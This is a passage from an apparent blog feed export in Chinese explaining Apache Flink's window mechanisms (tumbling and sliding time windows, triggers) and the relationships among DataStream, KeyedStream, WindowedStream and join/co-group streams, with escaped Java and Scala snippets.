&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// tumbling time window&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; WindowedStream&amp;lt;T, KEY, TimeWindow&amp;gt; &lt;span class=&quot;title&quot;&gt;timeWindow&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(Time size)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (environment.getStreamTimeCharacteristic() == TimeCharacteristic.ProcessingTime) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; window(TumblingProcessingTimeWindows.of(size));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; window(TumblingEventTimeWindows.of(size));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// sliding time window&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; WindowedStream&amp;lt;T, KEY, TimeWindow&amp;gt; &lt;span class=&quot;title&quot;&gt;timeWindow&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(Time size, Time slide)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (environment.getStreamTimeCharacteristic() == TimeCharacteristic.ProcessingTime) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; window(SlidingProcessingTimeWindows.of(size, slide));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; window(SlidingEventTimeWindows.of(size, slide));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在方法体内部会根据当前环境注册的时间类型，使用不同的WindowAssigner创建window。可以看到，EventTime和IngestTime都使用了&lt;code&gt;XXXEventTimeWindows&lt;/code&gt;这个assigner，因为EventTime和IngestTime在底层的实现上只是在Source处为Record打时间戳的实现不同，在window operator中的处理逻辑是一样的。&lt;/p&gt;
&lt;p&gt;这里我们主要分析sliding process time window，如下是相关源码：&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;SlidingProcessingTimeWindows&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;WindowAssigner&lt;/span&gt;&amp;lt;&lt;span class=&quot;title&quot;&gt;Object&lt;/span&gt;, &lt;span class=&quot;title&quot;&gt;TimeWindow&lt;/span&gt;&amp;gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; serialVersionUID = &lt;span class=&quot;number&quot;&gt;1L&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; size;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; slide;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;SlidingProcessingTimeWindows&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; size, &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; slide)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.size = size;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.slide = slide;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;meta&quot;&gt;@Override&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; Collection&amp;lt;TimeWindow&amp;gt; &lt;span class=&quot;title&quot;&gt;assignWindows&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(Object element, &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; timestamp)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    timestamp = System.currentTimeMillis();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    List&amp;lt;TimeWindow&amp;gt; windows = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; ArrayList&amp;lt;&amp;gt;((&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;) (size / slide));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// 对齐时间戳&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; lastStart = timestamp - timestamp % slide;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; start = lastStart;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      start &amp;gt; timestamp - size;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      start -= slide) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;comment&quot;&gt;// 当前时间戳对应了多个window&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      windows.add(&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; TimeWindow(start, start + size));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; windows;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;ProcessingTimeTrigger&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Trigger&lt;/span&gt;&amp;lt;&lt;span class=&quot;title&quot;&gt;Object&lt;/span&gt;, &lt;span class=&quot;title&quot;&gt;TimeWindow&lt;/span&gt;&amp;gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;meta&quot;&gt;@Override&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// 每个元素进入窗口都会调用该方法&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; TriggerResult &lt;span class=&quot;title&quot;&gt;onElement&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(Object element, &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; timestamp, TimeWindow window, TriggerContext ctx)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// 注册定时器，当系统时间到达window end timestamp时会回调该trigger的onProcessingTime方法&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ctx.registerProcessingTimeTimer(window.getEnd());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; TriggerResult.CONTINUE;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;meta&quot;&gt;@Override&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// 返回结果表示执行窗口计算并清空窗口&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; TriggerResult &lt;span class=&quot;title&quot;&gt;onProcessingTime&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; time, TimeWindow window, TriggerContext ctx)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; TriggerResult.FIRE_AND_PURGE;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;首先，&lt;code&gt;SlidingProcessingTimeWindows&lt;/code&gt;会对每个进入窗口的元素根据系统时间分配到&lt;code&gt;(size / slide)&lt;/code&gt;个不同的窗口，并会在每个窗口上根据窗口结束时间注册一个定时器（相同窗口只会注册一份），当定时器超时时意味着该窗口完成了，这时会回调对应窗口的Trigger的&lt;code&gt;onProcessingTime&lt;/code&gt;方法，返回FIRE_AND_PURGE，也就是会执行窗口计算并清空窗口。整个过程示意图如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB1iihcKXXXXXavXFXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;如上图所示横轴代表时间戳（为简化问题，时间戳从0开始），第一条record会被分配到[-5,5)和[0,10)两个窗口中，当系统时间到5时，就会计算[-5,5)窗口中的数据，并将结果发送出去，最后清空窗口中的数据，释放该窗口资源。&lt;/p&gt;
&lt;h3 id=&quot;Session-Window-实现&quot;&gt;&lt;a href=&quot;#Session-Window-实现&quot; class=&quot;headerlink&quot; title=&quot;Session Window 实现&quot;&gt;&lt;/a&gt;Session Window 实现&lt;/h3&gt;&lt;p&gt;Session Window 是一个需求很强烈的窗口机制，但Session也比之前的Window更复杂，所以 Flink 也是在即将到来的 1.1.0 版本中才支持了该功能。由于篇幅问题，我们将在后续的 &lt;a href=&quot;#&quot;&gt;Session Window 的实现&lt;/a&gt; 中深入探讨 Session Window 的实现。&lt;/p&gt;
&lt;h2 id=&quot;参考资料&quot;&gt;&lt;a href=&quot;#参考资料&quot; class=&quot;headerlink&quot; title=&quot;参考资料&quot;&gt;&lt;/a&gt;参考资料&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://ci.apache.org/projects/flink/flink-docs-release-1.0/concepts/concepts.html#time-and-windows&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Flink Concepts&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://flink.apache.org/news/2015/12/04/Introducing-windows.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Introducing Stream Windows in Apache Flink
&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://cwiki.apache.org/confluence/display/FLINK/Streaming+Window+Join+Rework&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Streaming Window Join Rework&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://cwiki.apache.org/confluence/pages/viewpage.action?pageId=60624830&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Window Semantics (and Implementation)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://blog.madhukaraphatak.com/introduction-to-flink-streaming-part-6&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Introduction to Flink Streaming - Part 6 : Anatomy of Window API&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://blog.madhukaraphatak.com/introduction-to-flink-streaming-part-5&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Introduction to Flink Streaming - Part 5 : Window API in Flink&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;Flink 认为 Batch 是 Streaming 的一个特例，所以 Flink 底层引擎是一个流式引擎，在上面实现了流处理和批处理。而窗口（window）就是从 Streaming 到 Batch 的一个桥梁。Flink 提供了非常完善的窗口机制，这是我认为的 Flink 最大的亮点之一（其他的亮点包括消息乱序处理，和 checkpoint 机制）。本文我们将介绍流式处理中的窗口概念，介绍 Flink 内建的一些窗口和 Window API，最后讨论下窗口在底层是如何实现的。&lt;/p&gt;
&lt;h2 id=&quot;什么是-Window&quot;&gt;&lt;a href=&quot;#什么是-Window&quot; class=&quot;headerlink&quot; title=&quot;什么是 Window&quot;&gt;&lt;/a&gt;什么是 Window&lt;/h2&gt;&lt;p&gt;在流处理应用中，数据是连续不断的，因此我们不可能等到所有数据都到了才开始处理。当然我们可以每来一个消息就处理一次，但是有时我们需要做一些聚合类的处理，例如：在过去的1分钟内有多少用户点击了我们的网页。在这种情况下，我们必须定义一个窗口，用来收集最近一分钟内的数据，并对这个窗口内的数据进行计算。&lt;/p&gt;
&lt;p&gt;窗口可以是时间驱动的（Time Window，例如：每30秒钟），也可以是数据驱动的（Count Window，例如：每一百个元素）。一种经典的窗口分类可以分成：翻滚窗口（Tumbling Window，无重叠），滚动窗口（Sliding Window，有重叠），和会话窗口（Session Window，活动间隙）。&lt;/p&gt;
    
    </summary>
    
      <category term="Flink" scheme="http://wuchong.me/categories/Flink/"/>
    
    
      <category term="Flink原理与实现" scheme="http://wuchong.me/tags/Flink%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/"/>
    
      <category term="Flink" scheme="http://wuchong.me/tags/Flink/"/>
    
  </entry>
  
  <entry>
    <title>Flink 原理与实现：数据流上的类型和操作</title>
    <link href="http://wuchong.me/blog/2016/05/20/flink-internals-streams-and-operations-on-streams/"/>
    <id>http://wuchong.me/blog/2016/05/20/flink-internals-streams-and-operations-on-streams/</id>
    <published>2016-05-20T15:56:48.000Z</published>
    <updated>2016-05-22T04:52:44.000Z</updated>
    
    <content type="html">&lt;p&gt;Flink 为流处理和批处理分别提供了 DataStream API 和 DataSet API。正是这种高层的抽象和 flunent API 极大地便利了用户编写大数据应用。不过很多初学者在看到&lt;a href=&quot;&quot;&gt;官方 Streaming 文档&lt;/a&gt;中那一大坨的转换时，常常会蒙了圈，文档中那些只言片语也很难讲清它们之间的关系。所以本文将介绍几种关键的数据流类型，它们之间是如何通过转换关联起来的。下图展示了 Flink 中目前支持的主要几种流的类型，以及它们之间的转换关系。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB1BWrvJVXXXXXbXVXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;DataStream&quot;&gt;&lt;a href=&quot;#DataStream&quot; class=&quot;headerlink&quot; title=&quot;DataStream&quot;&gt;&lt;/a&gt;DataStream&lt;/h2&gt;&lt;p&gt;&lt;code&gt;DataStream&lt;/code&gt; 是 Flink 流处理 API 中最核心的数据结构。它代表了一个运行在多个分区上的并行流。一个 &lt;code&gt;DataStream&lt;/code&gt; 可以从 &lt;code&gt;StreamExecutionEnvironment&lt;/code&gt; 通过&lt;code&gt;env.addSource(SourceFunction)&lt;/code&gt; 获得。&lt;/p&gt;
&lt;p&gt;DataStream 上的转换操作都是逐条的，比如 &lt;code&gt;map()&lt;/code&gt;，&lt;code&gt;flatMap()&lt;/code&gt;，&lt;code&gt;filter()&lt;/code&gt;。DataStream 也可以执行 &lt;code&gt;rebalance&lt;/code&gt;（再平衡，用来减轻数据倾斜）和 &lt;code&gt;broadcaseted&lt;/code&gt;（广播）等分区转换。&lt;/p&gt;
&lt;figure class=&quot;highlight scala&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; stream: &lt;span class=&quot;type&quot;&gt;DataStream&lt;/span&gt;[&lt;span class=&quot;type&quot;&gt;MyType&lt;/span&gt;] = env.addSource(&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;FlinkKafkaConsumer08&lt;/span&gt;[&lt;span class=&quot;type&quot;&gt;String&lt;/span&gt;](...))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; str1: &lt;span class=&quot;type&quot;&gt;DataStream&lt;/span&gt;[(&lt;span class=&quot;type&quot;&gt;String&lt;/span&gt;, &lt;span class=&quot;type&quot;&gt;MyType&lt;/span&gt;)] = stream.flatMap &amp;#123; ... &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; str2: &lt;span class=&quot;type&quot;&gt;DataStream&lt;/span&gt;[(&lt;span class=&quot;type&quot;&gt;String&lt;/span&gt;, &lt;span class=&quot;type&quot;&gt;MyType&lt;/span&gt;)] = stream.rebalance()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; str3: &lt;span class=&quot;type&quot;&gt;DataStream&lt;/span&gt;[&lt;span class=&quot;type&quot;&gt;AnotherType&lt;/span&gt;] = stream.map &amp;#123; ... &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;上述 DataStream 上的转换在运行时会转换成如下的执行图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB1aqPSJVXXXXbqXXXXXXXXXXXX&quot; width=&quot;450px&quot;&gt;&lt;/p&gt;
&lt;p&gt;如上图的执行图所示，DataStream 各个算子会并行运行，算子之间是数据流分区。如 Source 的第一个并行实例（S1）和 flatMap() 的第一个并行实例（m1）之间就是一个数据流分区。而在 flatMap() 和 map() 之间由于加了 rebalance()，它们之间的数据流分区就有3个子分区（m1的数据流向3个map()实例）。这与 Apache Kafka 是很类似的，把流想象成 Kafka Topic，而一个流分区就表示一个 Topic Partition，流的目标并行算子实例就是 Kafka Consumers。&lt;/p&gt;
&lt;h2 id=&quot;KeyedStream&quot;&gt;&lt;a href=&quot;#KeyedStream&quot; class=&quot;headerlink&quot; title=&quot;KeyedStream&quot;&gt;&lt;/a&gt;KeyedStream&lt;/h2&gt;&lt;p&gt;&lt;code&gt;KeyedStream&lt;/code&gt;用来表示根据指定的key进行分组的数据流。一个&lt;code&gt;KeyedStream&lt;/code&gt;可以通过调用&lt;code&gt;DataStream.keyBy()&lt;/code&gt;来获得。而在&lt;code&gt;KeyedStream&lt;/code&gt;上进行任何transformation都将转变回&lt;code&gt;DataStream&lt;/code&gt;。在实现中，&lt;code&gt;KeyedStream&lt;/code&gt;是把key的信息写入到了transformation中。每条记录只能访问所属key的状态，其上的聚合函数可以方便地操作和保存对应key的状态。&lt;/p&gt;
&lt;h2 id=&quot;WindowedStream-amp-AllWindowedStream&quot;&gt;&lt;a href=&quot;#WindowedStream-amp-AllWindowedStream&quot; class=&quot;headerlink&quot; title=&quot;WindowedStream &amp;amp; AllWindowedStream&quot;&gt;&lt;/a&gt;WindowedStream &amp;amp; AllWindowedStream&lt;/h2&gt;&lt;p&gt;&lt;code&gt;WindowedStream&lt;/code&gt;代表了根据key分组，并且基于&lt;code&gt;WindowAssigner&lt;/code&gt;切分窗口的数据流。所以&lt;code&gt;WindowedStream&lt;/code&gt;都是从&lt;code&gt;KeyedStream&lt;/code&gt;衍生而来的。而在&lt;code&gt;WindowedStream&lt;/code&gt;上进行任何transformation也都将转变回&lt;code&gt;DataStream&lt;/code&gt;。&lt;/p&gt;
&lt;figure class=&quot;highlight scala&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; stream: &lt;span class=&quot;type&quot;&gt;DataStream&lt;/span&gt;[&lt;span class=&quot;type&quot;&gt;MyType&lt;/span&gt;] = ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; windowed: &lt;span class=&quot;type&quot;&gt;WindowedDataStream&lt;/span&gt;[&lt;span class=&quot;type&quot;&gt;MyType&lt;/span&gt;] = stream&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        .keyBy(&lt;span class=&quot;string&quot;&gt;&quot;userId&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        .window(&lt;span class=&quot;type&quot;&gt;TumblingEventTimeWindows&lt;/span&gt;.of(&lt;span class=&quot;type&quot;&gt;Time&lt;/span&gt;.seconds(&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;))) &lt;span class=&quot;comment&quot;&gt;// Last 5 seconds of data&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; result: &lt;span class=&quot;type&quot;&gt;DataStream&lt;/span&gt;[&lt;span class=&quot;type&quot;&gt;ResultType&lt;/span&gt;] = windowed.reduce(myReducer)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;上述 WindowedStream 的样例代码在运行时会转换成如下的执行图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB1G2HqJVXXXXb4aXXXXXXXXXXX&quot; width=&quot;500px&quot;&gt;&lt;/p&gt;
&lt;p&gt;Flink 的窗口实现中会将到达的数据缓存在对应的窗口buffer中（一个数据可能会对应多个窗口）。当到达窗口发送的条件时（由Trigger控制），Flink 会对整个窗口中的数据进行处理。Flink 在聚合类窗口有一定的优化，即不会保存窗口中的所有值，而是每到一个元素执行一次聚合函数，最终只保存一份数据即可。&lt;/p&gt;
&lt;p&gt;在key分组的流上进行窗口切分是比较常用的场景，也能够很好地并行化（不同的key上的窗口聚合可以分配到不同的task去处理）。不过有时候我们也需要在普通流上进行窗口的操作，这就是 &lt;code&gt;AllWindowedStream&lt;/code&gt;。&lt;code&gt;AllWindowedStream&lt;/code&gt;是直接在&lt;code&gt;DataStream&lt;/code&gt;上进行&lt;code&gt;windowAll(...)&lt;/code&gt;操作。AllWindowedStream 的实现是基于 WindowedStream 的（Flink 1.1.x 开始）。Flink 不推荐使用&lt;code&gt;AllWindowedStream&lt;/code&gt;，因为在普通流上进行窗口操作，就势必需要将所有分区的流都汇集到单个的Task中，而这个单个的Task很显然就会成为整个Job的瓶颈。&lt;/p&gt;
&lt;h2 id=&quot;JoinedStreams-amp-CoGroupedStreams&quot;&gt;&lt;a href=&quot;#JoinedStreams-amp-CoGroupedStreams&quot; class=&quot;headerlink&quot; title=&quot;JoinedStreams &amp;amp; CoGroupedStreams&quot;&gt;&lt;/a&gt;JoinedStreams &amp;amp; CoGroupedStreams&lt;/h2&gt;&lt;p&gt;双流 Join 也是一个非常常见的应用场景。深入源码你可以发现，JoinedStreams 和 CoGroupedStreams 的代码实现有80%是一模一样的，JoinedStreams 在底层又调用了 CoGroupedStreams 来实现 Join 功能。除了名字不一样，一开始很难将它们区分开来，而且为什么要提供两个功能类似的接口呢？？&lt;/p&gt;
&lt;p&gt;实际上这两者还是很点区别的。首先 co-group 侧重的是group，是对同一个key上的两组集合进行操作，而 join 侧重的是pair，是对同一个key上的每对元素进行操作。co-group 比 join 更通用一些，因为 join 只是 co-group 的一个特例，所以 join 是可以基于 co-group 来实现的（当然有优化的空间）。而在 co-group 之外又提供了 join 接口是因为用户更熟悉 join（源于数据库吧），而且能够跟 DataSet API 保持一致，降低用户的学习成本。&lt;/p&gt;
&lt;p&gt;JoinedStreams 和 CoGroupedStreams 是基于 Window 上实现的，所以 CoGroupedStreams 最终又调用了 WindowedStream 来实现。&lt;/p&gt;
&lt;figure class=&quot;highlight scala&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; firstInput: &lt;span class=&quot;type&quot;&gt;DataStream&lt;/span&gt;[&lt;span class=&quot;type&quot;&gt;MyType&lt;/span&gt;] = ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; secondInput: &lt;span class=&quot;type&quot;&gt;DataStream&lt;/span&gt;[&lt;span class=&quot;type&quot;&gt;AnotherType&lt;/span&gt;] = ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; result: &lt;span class=&quot;type&quot;&gt;DataStream&lt;/span&gt;[(&lt;span class=&quot;type&quot;&gt;MyType&lt;/span&gt;, &lt;span class=&quot;type&quot;&gt;AnotherType&lt;/span&gt;)] = 